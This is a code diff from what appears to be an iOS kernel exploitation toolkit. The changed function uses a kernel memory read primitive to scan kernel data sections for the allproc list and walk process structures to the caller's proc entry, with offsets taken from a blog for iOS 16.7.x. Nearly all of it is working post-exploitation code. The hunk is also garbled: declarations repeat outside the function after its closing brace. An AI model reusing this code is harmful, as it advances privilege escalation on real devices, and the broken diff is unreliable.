@@ -1105,30 +1105,146 @@ static uint64_t SCFindCurrentProc(SCKReadFunction kread,
                                    pid_t targetPid,
                                    NSMutableDictionary *diagnostics,
                                    const size_t *pidOffsets, size_t pidOffsetCount) {
-    // Find allproc by leveraging the LIST_ENTRY(le_prev) invariant.
+    // Find allproc by scanning __DATA for a pointer to a proc linked list.
+    // Blog confirms for iOS 16.7.x (XNU 8796): p_list.le_next at +0x00, p_pid at +0x60.
     //
-    // On XNU, struct proc contains LIST_ENTRY(proc) p_list at some offset:
-    //   le_next: pointer to next proc (or NULL)
-    //   le_prev: pointer to &previous->le_next (or &allproc.lh_first for first)
-    //
-    // For the first proc: le_prev == &allproc (address in __DATA where we
-    // found the pointer). For second proc: le_prev == &first->le_next.
-    //
-    // If pidOffsetHint is non-zero (from proc_pid() accessor scan), we
-    // validate PID at that exact offset only, making the search much faster.
+    // Strategy: for each kernel pointer in __DATA, treat it as allproc.lh_first,
+    // read the first proc, check PID at 0x60 is valid (0-65535), follow le_next
+    // at offset 0, check second proc PID is valid and different. If both pass,
+    // walk the full list looking for our PID. No le_prev validation needed.
 
     const size_t chunkSize = 8192;
     const size_t procBufSize = 512;
+    const size_t pidOff = 0x60;  // blog-confirmed p_pid offset
 
     uint8_t *chunk = malloc(chunkSize);
     uint8_t *firstBuf = malloc(procBufSize);
-    uint8_t *secondBuf = malloc(procBufSize);
-    uint8_t *thirdBuf = malloc(procBufSize);
     uint8_t *walkBuf = malloc(procBufSize);
-    if (!chunk || !firstBuf || !secondBuf || !thirdBuf || !walkBuf) {
-        free(chunk); free(firstBuf); free(secondBuf); free(thirdBuf); free(walkBuf);
+    if (!chunk || !firstBuf || !walkBuf) {
+        free(chunk); free(firstBuf); free(walkBuf);
         return 0;
     }
+
+    struct { uint64_t addr; uint64_t size; const char *name; } scans[5];
+    int scanCount = 0;
+    if (sections->segmentSize > 0) {
+        scans[scanCount].addr = sections->segmentAddr;
+        scans[scanCount].size = sections->segmentSize;
+        scans[scanCount].name = "__DATA";
+        scanCount++;
+    }
+    if (sections->dataConstSize > 0) {
+        scans[scanCount].addr = sections->dataConstAddr;
+        scans[scanCount].size = sections->dataConstSize;
+        scans[scanCount].name = "__DATA_CONST";
+        scanCount++;
+    }
+    if (sections->commonSize > 0) {
+        scans[scanCount].addr = sections->commonAddr;
+        scans[scanCount].size = sections->commonSize;
+        scans[scanCount].name = "__common";
+        scanCount++;
+    }
+    if (sections->bssSize > 0) {
+        scans[scanCount].addr = sections->bssAddr;
+        scans[scanCount].size = sections->bssSize;
+        scans[scanCount].name = "__bss";
+        scanCount++;
+    }
+    if (sections->dataSize > 0) {
+        scans[scanCount].addr = sections->dataAddr;
+        scans[scanCount].size = sections->dataSize;
+        scans[scanCount].name = "__data";
+        scanCount++;
+    }
+
+    int totalCandidates = 0;
+    int pidValidated = 0;
+    int maxWalkLen = 0;
+
+    for (int si = 0; si < scanCount; si++) {
+        uint64_t scanAddr = scans[si].addr;
+        uint64_t scanSize = scans[si].size;
+        if (scanAddr == 0 || scanSize == 0) continue;
+        if (scanSize > 8 * 1024 * 1024) scanSize = 8 * 1024 * 1024;
+
+        for (uint64_t offset = 0; offset < scanSize; offset += chunkSize - 8) {
+            size_t readSize = chunkSize;
+            if (offset + readSize > scanSize) readSize = (size_t)(scanSize - offset);
+            if (readSize < 16) break;
+
+            if (kread(scanAddr + offset, chunk, readSize) != 0) continue;
+
+            for (size_t i = 0; i + 8 <= readSize; i += 8) {
+                uint64_t firstProc = *(uint64_t *)(chunk + i);
+                if (!SCKernelPtrValid(firstProc)) continue;
+                totalCandidates++;
+
+                // Read first proc
+                if (kread(firstProc, firstBuf, procBufSize) != 0) continue;
+
+                // Check PID at 0x60 (blog-confirmed)
+                uint32_t pid1 = *(uint32_t *)(firstBuf + pidOff);
+                if (pid1 > 65535) continue;
+
+                // Follow le_next at offset 0
+                uint64_t leNext1 = *(uint64_t *)(firstBuf + 0);
+                if (leNext1 == 0 || !SCKernelPtrValid(leNext1)) continue;
+
+                // Read second proc, check PID is valid and different
+                if (kread(leNext1, walkBuf, procBufSize) != 0) continue;
+                uint32_t pid2 = *(uint32_t *)(walkBuf + pidOff);
+                if (pid2 > 65535 || pid2 == pid1) continue;
+
+                // Follow le_next again for third proc
+                uint64_t leNext2 = *(uint64_t *)(walkBuf + 0);
+                if (leNext2 == 0 || !SCKernelPtrValid(leNext2)) continue;
+                if (kread(leNext2, walkBuf, procBufSize) != 0) continue;
+                uint32_t pid3 = *(uint32_t *)(walkBuf + pidOff);
+                if (pid3 > 65535 || pid3 == pid1 || pid3 == pid2) continue;
+                pidValidated++;
+
+                // Walk the list looking for our PID
+                uint64_t procAddr = firstProc;
+                int walkCount = 0;
+                while (procAddr != 0 && walkCount < 4096) {
+                    if (procAddr == firstProc) {
+                        memcpy(walkBuf, firstBuf, procBufSize);
+                    } else {
+                        if (kread(procAddr, walkBuf, procBufSize) != 0) break;
+                    }
+
+                    if (*(uint32_t *)(walkBuf + pidOff) == (uint32_t)targetPid) {
+                        free(chunk); free(firstBuf); free(walkBuf);
+                        diagnostics[@"allprocSection"] = [NSString stringWithUTF8String:scans[si].name];
+                        diagnostics[@"allprocOffset"] = @(offset + i);
+                        diagnostics[@"allprocAddress"] = SCHexAddress(scanAddr + offset + i);
+                        diagnostics[@"procListOffset"] = @0;
+                        diagnostics[@"procPidOffset"] = @(pidOff);
+                        diagnostics[@"procAddress"] = SCHexAddress(procAddr);
+                        diagnostics[@"scanCandidates"] = @(totalCandidates);
+                        diagnostics[@"pidValidated"] = @(pidValidated);
+                        diagnostics[@"maxWalkLen"] = @(walkCount + 1);
+                        return procAddr;
+                    }
+
+                    uint64_t next = *(uint64_t *)(walkBuf + 0);
+                    if (next == procAddr) break;
+                    procAddr = next;
+                    if (procAddr != 0 && !SCKernelPtrValid(procAddr)) break;
+                    walkCount++;
+                }
+                if (walkCount > maxWalkLen) maxWalkLen = walkCount;
+            }
+        }
+    }
+
+    free(chunk); free(firstBuf); free(walkBuf);
+    diagnostics[@"scanCandidates"] = @(totalCandidates);
+    diagnostics[@"pidValidated"] = @(pidValidated);
+    diagnostics[@"maxWalkLen"] = @(maxWalkLen);
+    return 0;
+}
 
     struct { uint64_t addr; uint64_t size; const char *name; } scans[5];
     int scanCount = 0;
